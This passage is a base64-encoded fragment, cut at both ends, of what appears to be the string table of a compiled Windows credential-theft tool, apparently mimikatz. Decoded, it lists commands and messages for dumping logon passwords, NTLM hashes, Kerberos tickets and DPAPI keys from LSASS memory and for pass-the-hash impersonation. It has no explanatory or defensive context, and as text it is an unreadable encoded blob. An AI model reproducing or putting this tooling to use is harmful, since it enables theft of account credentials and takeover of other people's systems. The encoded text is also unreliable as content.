8AcgBkAE8AcgBCAGkAbwBtAGUAdAByAGkAYwAgADsAIABSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAFMASQBEACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0AF8AZABlAHMAYwBJAHQAZQBtAF8AUABJAE4ATABvAGcAbwBuAE8AcgBQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAQwBvAG4AdgBlAHIAdABTAGkAZABUAG8AUwB0AHIAaQBuAGcAUwBpAGQAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdABfAGQAZQBzAGMASQB0AGUAbQBfAFAASQBOAEwAbwBnAG8AbgBPAHIAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQATwByAEIAaQBvAG0AZQB0AHIAaQBjACAAOwAgAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAACQAJAFAAYQBzAHMAdwBvAHIAZAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAACQAJAFAASQBOACAAQwBvAGQAZQAgACAAIAAgACAAIAAgACAAOgAgACUAMAA0AGgAdQAKAAAAAAAJAAkAQgBhAGMAawBnAHIAbwB1AG4AZAAgAHAAYQB0AGgAIAA6ACAAJQBzAAoAAAAAAAAAAAAAAAkACQBQAGkAYwB0AHUAcgBlACAAcABhAHMAcwB3AG8AcgBkACAAKABnAHIAaQBkACAAaQBzACAAMQA1ADAAKgAxADAAMAApAAoAAAAAAAAACQAJACAAWwAlAHUAXQAgAAAAAAAAAAAAcABvAGkAbgB0ACAAIAAoAHgAIAA9ACAAJQAzAHUAIAA7ACAAeQAgAD0AIAAlADMAdQApAAAAAABjAGwAbwBjAGsAdwBpAHMAZQAAAAAAAABhAG4AdABpAGMAbABvAGMAawB3AGkAcwBlAAAAAAAAAAAAAAAAAAAAYwBpAHIAYwBsAGUAIAAoAHgAIAA9ACAAJQAzAHUAIAA7ACAAeQAgAD0AIAAlADMAdQAgADsAIAByACAAPQAgACUAMwB1ACkAIAAtACAAJQBzAAAAAAAAAAAAAAAAAAAAbABpAG4AZQAgACAAIAAoAHgAIAA9ACAAJQAzAHUAIAA7ACAAeQAgAD0AIAAlADMAdQApACAALQA+ACAAKAB4ACAAPQAgACUAMwB1ACAAOwAgAHkAIAA9ACAAJQAzAHUAKQAAAAAAAAAlAHUACgAAAAkACQBQAHIAbwBwAGUAcgB0AHkAIAAgACAAIAAgACAAIAAgADoAIAAAAAAAAAAAACUALgAqAHMAXAAAAAAAAAAlAC4AKgBzAAAAAAAAAAAAdABvAGQAbwAgAD8ACgAAAAkATgBhAG0AZQAgACAAIAAgACAAIAAgADoAIAAlAHMACgAAAAAAAAB0AGUAbQBwACAAdgBhAHUAbAB0AAAAAAAJAFAAYQB0AGgAIAAgACAAIAAgACAAIAA6ACAAJQBzAAoAAAAAAAAAJQBoAHUAAAAlAHUAAAAAAFsAVAB5AHAAZQAgACUAdQBdACAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AYwByAGUAZAAgADsAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGMAcgBlAGQAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAHQAVgBlAHIAeQBCAGEAcwBpAGMATQBvAGQAdQBsAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAHMARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGMAcgBlAGQAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGMAcgBlAGQAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AZwBlAHQAVQBuAGkAcQB1AGUARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAPwAgACgAdAB5AHAAZQAgAD4AIABDAFIARQBEAF8AVABZAFAARQBfAE0AQQBYAEkATQBVAE0AKQAAAAAAAAAAADwATgBVAEwATAA+AAAAAAAAAAAAAAAAAFQAYQByAGcAZQB0AE4AYQBtAGUAIAA6ACAAJQBzACAALwAgACUAcwAKAFUAcwBlAHIATgBhAG0AZQAgACAAIAA6ACAAJQBzAAoAQwBvAG0AbQBlAG4AdAAgACAAIAAgADoAIAAlAHMACgBUAHkAcABlACAAIAAgACAAIAAgACAAOgAgACUAdQAgAC0AIAAlAHMACgBDAHIAZQBkAGUAbgB0AGkAYQBsACAAOgAgAAAACgAKAAAAAABpAG4AZgBvAHMAAAAAAAAATQBpAG4AZQBTAHcAZQBlAHAAZQByACAAbQBvAGQAdQBsAGUAAAAAAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgAAAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgAuAGUAeABlAAAAAAAAAAAAAABGAGkAZQBsAGQAIAA6ACAAJQB1ACAAcgAgAHgAIAAlAHUAIABjAAoATQBpAG4AZQBzACAAOgAgACUAdQAKAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzACAAOwAgAE0AZQBtAG8AcgB5ACAAQwAgACgAUgAgAD0AIAAlAHUAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgBfAGkAbgBmAG8AcwAgADsAIABNAGUAbQBvAHIAeQAgAFIACgAAAAAACQAAAAAAAAAlAEMAIAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAAQgBvAGEAcgBkACAAYwBvAHAAeQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAARwBhAG0AZQAgAGMAbwBwAHkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAARwAgAGMAbwBwAHkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAARwBsAG8AYgBhAGwAIABjAG8AcAB5AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAAUwBlAGEAcgBjAGgAIABpAHMAIABLAE8ACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAATQBpAG4AZQBzAHcAZQBlAHAAZQByACAATgBUACAASABlAGEAZABlAHIAcwAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgBfAGkAbgBmAG8AcwAgADsAIABNAGkAbgBlAHMAdwBlAGUAcABlAHIAIABQAEUAQgAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzACAAOwAgAE4AbwAgAE0AaQBuAGUAUwB3AGUAZQBwAGUAcgAgAGkAbgAgAG0AZQBtAG8AcgB5ACEACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAXwBwAGEAcgBzAGUARgBpAGUAbABkACAAOwAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAGEAZAAgAGUAbABlAG0AZQBuAHQAcwAgAGYAcgBvAG0AIABjAG8AbAB1AG0AbgA6ACAAJQB1AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgBfAGkAbgBmAG8AcwBfAHAAYQByAHMAZQBGAGkAZQBsAGQAIAA7ACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAYQBkACAAcgBlAGYAZQByAGUAbgBjAGUAcwAgAGYAcgBvAG0AIABjAG8AbAB1AG0AbgA6ACAAJQB1AAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzAF8AcABhAHIAcwBlAEYAaQBlAGwAZAAgADsAIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQBhAGQAIAByAGUAZgBlAHIAZQBuAGMAZQBzAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzAF8AcABhAHIAcwBlAEYAaQBlAGwAZAAgADsAIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQBhAGQAIABmAGkAcgBzAHQAIABlAGwAZQBtAGUAbgB0AAoAAAAAAAAAbABzAGEAcwByAHYAAAAAAExzYUlDYW5jZWxOb3RpZmljYXRpb24AAExzYUlSZWdpc3Rlck5vdGlmaWNhdGlvbgAAAAAAAAAAYgBjAHIAeQBwAHQAAAAAAEJDcnlwdE9wZW5BbGdvcml0aG1Qcm92aWRlcgAAAAAAQkNyeXB0U2V0UHJvcGVydHkAAAAAAAAAQkNyeXB0R2V0UHJvcGVydHkAAAAAAAAAQkNyeXB0R2VuZXJhdGVTeW1tZXRyaWNLZXkAAAAAAABCQ3J5cHRFbmNyeXB0AAAAQkNyeXB0RGVjcnlwdAAAAEJDcnlwdERlc3Ryb3lLZXkAAAAAAAAAAEJDcnlwdENsb3NlQWxnb3JpdGhtUHJvdmlkZXIAAAAAMwBEAEUAUwAAAAAAAAAAAEMAaABhAGkAbgBpAG4AZwBNAG8AZABlAEMAQgBDAAAAQwBoAGEAaQBuAGkAbgBnAE0AbwBkAGUAAAAAAAAAAABPAGIAagBlAGMAdABMAGUAbgBnAHQAaAAAAAAAAAAAAEEARQBTAAAAQwBoAGEAaQBuAGkAbgBnAE0AbwBkAGUAQwBGAEIAAABDAGEAYwBoAGUAZABVAG4AbABvAGMAawAAAAAAAAAAAEMAYQBjAGgAZQBkAFIAZQBtAG8AdABlAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAAAEMAYQBjAGgAZQBkAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAAAAAAAABSAGUAbQBvAHQAZQBJAG4AdABlAHIAYQBjAHQAaQB2AGUAAAAAAAAATgBlAHcAQwByAGUAZABlAG4AdABpAGEAbABzAAAAAABOAGUAdAB3AG8AcgBrAEMAbABlAGEAcgB0AGUAeAB0AAAAAAAAAAAAVQBuAGwAbwBjAGsAAAAAAFAAcgBvAHgAeQAAAAAAAABTAGUAcgB2AGkAYwBlAAAAQgBhAHQAYwBoAAAAAAAAAE4AZQB0AHcAbwByAGsAAABJAG4AdABlAHIAYQBjAHQAaQB2AGUAAABVAG4AawBuAG8AdwBuACAAIQAAAAAAAABVAG4AZABlAGYAaQBuAGUAZABMAG8AZwBvAG4AVAB5AHAAZQAAAAAATABpAHMAdAAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAE0AYQBuAGEAZwBlAHIAAAAAAAAAAABjAHIAZQBkAG0AYQBuAAAATABpAHMAdAAgAEMAYQBjAGgAZQBkACAATQBhAHMAdABlAHIASwBlAHkAcwAAAAAAZABwAGEAcABpAAAAAAAAAEwAaQBzAHQAIABLAGUAcgBiAGUAcgBvAHMAIABFAG4AYwByAHkAcAB0AGkAbwBuACAASwBlAHkAcwAAAAAAAABlAGsAZQB5AHMAAAAAAAAATABpAHMAdAAgAEsAZQByAGIAZQByAG8AcwAgAHQAaQBjAGsAZQB0AHMAAAAAAAAAdABpAGMAawBlAHQAcwAAAFAAYQBzAHMALQB0AGgAZQAtAGgAYQBzAGgAAAAAAAAAcAB0AGgAAABTAHcAaQB0AGMAaAAgACgAbwByACAAcgBlAGkAbgBpAHQAKQAgAHQAbwAgAEwAUwBBAFMAUwAgAG0AaQBuAGkAZAB1AG0AcAAgAGMAbwBuAHQAZQB4AHQAAAAAAAAAAABtAGkAbgBpAGQAdQBtAHAAAAAAAAAAAAAAAAAAAAAAAFMAdwBpAHQAYwBoACAAKABvAHIAIAByAGUAaQBuAGkAdAApACAAdABvACAATABTAEEAUwBTACAAcAByAG8AYwBlAHMAcwAgACAAYwBvAG4AdABlAHgAdAAAAAAAAAAAAEwAaQBzAHQAcwAgAGEAbABsACAAYQB2AGEAaQBsAGEAYgBsAGUAIABwAHIAbwB2AGkAZABlAHIAcwAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAAAABsAG8AZwBvAG4AUABhAHMAcwB3AG8AcgBkAHMAAAAAAEwAaQBzAHQAcwAgAFMAUwBQACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAAAAAAHMAcwBwAAAATABpAHMAdABzACAATABpAHYAZQBTAFMAUAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAAAABsAGkAdgBlAHMAcwBwAAAATABpAHMAdABzACAAVABzAFAAawBnACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAdABzAHAAawBnAAAAAAAAAEwAaQBzAHQAcwAgAEsAZQByAGIAZQByAG8AcwAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAATABpAHMAdABzACAAVwBEAGkAZwBlAHMAdAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAAAAB3AGQAaQBnAGUAcwB0AAAATABpAHMAdABzACAATABNACAAJgAgAE4AVABMAE0AIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAABtAHMAdgAAAAAAAAAAAAAAUwBvAG0AZQAgAGMAbwBtAG0AYQBuAGQAcwAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAC4ALgAuAAAAAAAAAFMAZQBrAHUAcgBMAFMAQQAgAG0AbwBkAHUAbABlAAAAcwBlAGsAdQByAGwAcwBhAAAAAAAAAAAAUwB3AGkAdABjAGgAIAB0AG8AIABQAFIATwBDAEUAUwBTAAoAAAAAAFMAdwBpAHQAYwBoACAAdABvACAATQBJAE4ASQBEAFUATQBQACAAOgAgAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBtAGkAbgBpAGQAdQBtAHAAIAA7ACAAPABtAGkAbgBpAGQAdQBtAHAAZgBpAGwAZQAuAGQAbQBwAD4AIABhAHIAZwB1AG0AZQBuAHQAIABpAHMAIABtAGkAcwBzAGkAbgBnAAoAAAAAAAAAAAAAAAAAAAAAAE8AcABlAG4AaQBuAGcAIAA6ACAAJwAlAHMAJwAgAGYAaQBsAGUAIABmAG8AcgAgAG0AaQBuAGkAZAB1AG0AcAAuAC4ALgAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEwAUwBBAFMAUwAgAHAAcgBvAGMAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAAgACgAPwApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATQBpAG4AaQBkAHUAbQBwACAAcABJAG4AZgBvAHMALQA+AE0AYQBqAG8AcgBWAGUAcgBzAGkAbwBuACAAKAAlAHUAKQAgACEAPQAgAE0ASQBNAEkASwBBAFQAWgBfAE4AVABfAE0AQQBKAE8AUgBfAFYARQBSAFMASQBPAE4AIAAoACUAdQApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABNAGkAbgBpAGQAdQBtAHAAIABwAEkAbgBmAG8AcwAtAD4AUAByAG8AYwBlAHMAcwBvAHIAQQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoACUAdQApACAAIQA9ACAAUABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAEEATQBEADYANAAgACgAJQB1ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABNAGkAbgBpAGQAdQBtAHAAIAB3AGkAdABoAG8AdQB0ACAAUwB5AHMAdABlAG0ASQBuAGYAbwBTAHQAcgBlAGEAbQAgACgAPwApAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAASwBlAHkAIABpAG0AcABvAHIAdAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATABvAGcAbwBuACAAbABpAHMAdAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATQBvAGQAdQBsAGUAcwAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABNAGUAbQBvAHIAeQAgAG8AcABlAG4AaQBuAGcACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAASABhAG4AZABsAGUAIABvAG4AIABtAGUAbQBvAHIAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABMAG8AYwBhAGwAIABMAFMAQQAgAGwAaQBiAHIAYQByAHkAIABmAGEAaQBsAGUAZAAKAAAAAAAAAAAACQAlAHMAIAA6AAkAAAAAAAoAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAASQBkACAAOgAgACUAdQAgADsAIAAlAHUAIAAoACUAMAA4AHgAOgAlADAAOAB4ACkACgBTAGUAcwBzAGkAbwBuACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQBzACAAZgByAG8AbQAgACUAdQAKAFUAcwBlAHIAIABOAGEAbQBlACAAIAAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAKAEQAbwBtAGEAaQBuACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAKAFMASQBEACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAAAAAAAAAAAHIAdQBuAAAAAAAAAAAAAAB1AHMAZQByAAkAOgAgACUAcwAKAGQAbwBtAGEAaQBuAAkAOgAgACUAcwAKAHAAcgBvAGcAcgBhAG0ACQA6ACAAJQBzAAoAAABBAEUAUwAxADIAOAAJADoAIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAEEARQBTADEAMgA4ACAAawBlAHkAIABsAGUAbgBnAHQAaAAgAG0AdQBzAHQAIABiAGUAIAAzADIAIAAoADEANgAgAGIAeQB0AGUAcwApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAEEARQBTADEAMgA4ACAAawBlAHkAIABvAG4AbAB5ACAAcwB1AHAAcABvAHIAdABlAGQAIABmAHIAbwBtACAAVwBpAG4AZABvAHcAcwAgADgALgAxACAAKABvAHIAIAA3AC8AOAAgAHcAaQB0AGgAIABrAGIAMgA4ADcAMQA5ADkANwApAAoAAABBAEUAUwAyADUANgAJADoAIAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQQBFAFMAMgA1ADYAIABrAGUAeQAgAGwAZQBuAGcAdABoACAAbQB1AHMAdAAgAGIAZQAgADYANAAgACgAMwAyACAAYgB5AHQAZQBzACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQQBFAFMAMgA1ADYAIABrAGUAeQAgAG8AbgBsAHkAIABzAHUAcABwAG8AcgB0AGUAZAAgAGYAcgBvAG0AIABXAGkAbgBkAG8AdwBzACAAOAAuADEAIAAoAG8AcgAgADcALwA4ACAAdwBpAHQAaAAgAGsAYgAyADgANwAxADkAOQA3ACkACgAAAG4AdABsAG0AAAAAAAAAAABOAFQATABNAAkAOgAgAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABuAHQAbABtACAAaABhAHMAaAAgAGwAZQBuAGcAdABoACAAbQB1AHMAdAAgAGIAZQAgADMAMgAgACgAMQA2ACAAYgB5AHQAZQBzACkACgAAACAAIAB8ACAAIABQAEkARAAgACAAJQB1AAoAIAAgAHwAIAAgAFQASQBEACAAIAAlAHUACgAAAAAAIAAgAHwAIAAgAEwAVQBJAEQAIAAlAHUAIAA7ACAAJQB1ACAAKAAlADAAOAB4ADoAJQAwADgAeAApAAoAAAAAACAAIABcAF8AIABtAHMAdgAxAF8AMAAgACAAIAAtACAAAAAAAAAAAAAgACAAXABfACAAawBlAHIAYgBlAHIAbwBzACAALQAgAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABHAGUAdABUAG8AawBlAG4ASQBuAGYAbwByAG0AYQB0AGkAbwBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwBUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAFcAaQB0AGgATABvAGcAbwBuAFcAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAE0AaQBzAHMAaQBuAGcAIABhAHQAIABsAGUAYQBzAHQAIABvAG4AZQAgAGEAcgBnAHUAbQBlAG4AdAAgADoAIABuAHQAbABtACAATwBSACAAYQBlAHMAMQAyADgAIABPAFIAIABhAGUAcwAyADUANgAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAATQBpAHMAcwBpAG4AZwAgAGEAcgBnAHUAbQBlAG4AdAAgADoAIABkAG8AbQBhAGkAbgAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAE0AaQBzAHMAaQBuAGcAIABhAHIAZwB1AG0AZQBuAHQAIAA6ACAAdQBzAGUAcgAKAAAAAAAAAAAACgAJACAAKgAgAFUAcwBlAHIAbgBhAG0AZQAgADoAIAAlAHcAWgAKAAkAIAAqACAARABvAG0AYQBpAG4AIAAgACAAOgAgACUAdwBaAAAAAAAKAAkAIAAqACAATABNACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAACgAJACAAKgAgAE4AVABMAE0AIAAgACAAIAAgADoAIAAAAAAAAAAAAAoACQAgACoAIABTAEgAQQAxACAAIAAgACAAIAA6ACAAAAAAAAAAAAAAAAAAAAAAAAoACQAgACoAIABGAGwAYQBnAHMAIAAgACAAIAA6ACAAJQAwADIAeAAvAE4AJQAwADIAeAAvAEwAJQAwADIAeAAvAFMAJQAwADIAeAAvACUAMAAyAHgALwAlADAAMgB4AC8AJQAwADIAeAAvACUAMAAyAHgAAAAAAAoACQAgACoAIAB1AG4AawBuAG8AdwAgACAAIAA6ACAAAAAAAAAAAABbADAALgAuADAAXQAAAAAACgAJACAAKgAgAFIAYQB3ACAAZABhAHQAYQAgADoAIAAAAAAAAAAAAAoACQAgACoAIABQAEkATgAgAGMAbwBkAGUAIAA6ACAAJQB3AFoAAAAJACAAIAAgACUAcwAgAAAAPABuAG8AIABzAGkAegBlACwAIABiAHUAZgBmAGUAcgAgAGkAcwAgAGkAbgBjAG8AcgByAGUAYwB0AD4AAAAAACUAdwBaAAkAJQB3AFoACQAAAAAAAAAAAAAAAAAAAAAACgAJACAAKgAgAFUAcwBlAHIAbgBhAG0AZQAgADoAIAAlAHcAWgAKAAkAIAAqACAARABvAG0AYQBpAG4AIAAgACAAOgAgACUAdwBaAAoACQAgACoAIABQAGEAcwBzAHcAbwByAGQAIAA6ACAAAAAAAEwAVQBJAEQAIABLAE8ACgAAAAAAAAAAAAoACQAgACoAIABSAG8AbwB0AEsAZQB5ACAAIAA6ACAAAAAAAAAAAAAKAAkAIAAqACAARABQAEEAUABJACAAIAAgACAAOgAgAAAAAAAAAAAACgAJACAAKgAgACUAMAA4AHgAIAA6ACAAAAAAAAAAAAAKAAkAIABbACUAMAA4AHgAXQAAAAAAAABkAHAAYQBwAGkAcwByAHYALgBkAGwAbAAAAAAAAAAAAAkAIABbACUAMAA4AHgAXQAKAAkAIAAqACAARwBVAEkARAAgACAAIAAgACAAIAA6AAkAAAAAAAAACgAJACAAKgAgAFQAaQBtAGUAIAAgACAAIAAgACAAOgAJAAAAAAAAAAoACQAgACoAIABNAGEAcwB0AGUAcgBLAGUAeQAgADoACQAAAAAAAAAKAAkASwBPAAAAAAAAAAAAVABpAGMAawBlAHQAIABHAHIAYQBuAHQAaQBuAGcAIABUAGkAYwBrAGUAdAAAAAAAQwBsAGkAZQBuAHQAIABUAGkAYwBrAGUAdAAgAD8AAABUAGkAYwBrAGUAdAAgAEcAcgBhAG4AdABpAG4AZwAgAFMAZQByAHYAaQBjAGUAAABrAGUAcgBiAGUAcgBvAHMALgBkAGwAbAAAAAAAAAAAAAoACQBHAHIAbwB1AHAAIAAlAHUAIAAtACAAJQBzAAAACgAJACAAKgAgAEsAZQB5ACAATABpAHMAdAAgADoACgAAAAAAAAAAAGQAYQB0AGEAIABjAG8AcAB5ACAAQAAgACUAcAAAAAAACgAgACAAIABcAF8AIAAlAHMAIAAAAAAALQA+ACAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGUAbgB1AG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBjAGEAbABsAGIAYQBjAGsAXwBwAHQAaAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AYwBvAHAAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAACgAgACAAIABcAF8AIAAqAFAAYQBzAHMAdwBvAHIAZAAgAHIAZQBwAGwAYQBjAGUAIAAtAD4AIAAAAAAAAAAAAG4AdQBsAGwAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGsAZQByAGIAZQByAG8AcwBfAGUAbgB1AG0AXwB0AGkAYwBrAGUAdABzACAAOwAgAGsAdQBsA